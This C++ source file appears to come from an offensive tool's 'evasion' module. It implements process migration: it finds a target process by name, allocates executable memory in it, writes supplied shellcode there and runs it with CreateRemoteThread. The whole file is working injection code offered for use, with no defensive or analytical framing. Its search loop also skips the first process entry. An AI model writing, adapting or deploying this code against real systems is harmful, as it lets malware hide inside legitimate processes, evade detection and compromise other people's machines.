#include "core/evasion/process_migration.hpp"
#include <tlhelp32.h>
#include <iostream>

int ProcessMigration::FindTarget(const std::string& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (std::string(entry.szExeFile) == processName) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

bool ProcessMigration::Inject(int pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    
    // Allocate Memory
    void* execMem = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Write Shellcode
    if (!WriteProcessMemory(hProcess, execMem, shellcode.data(), shellcode.size(), NULL)) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Execute
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProcess);
        return false;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
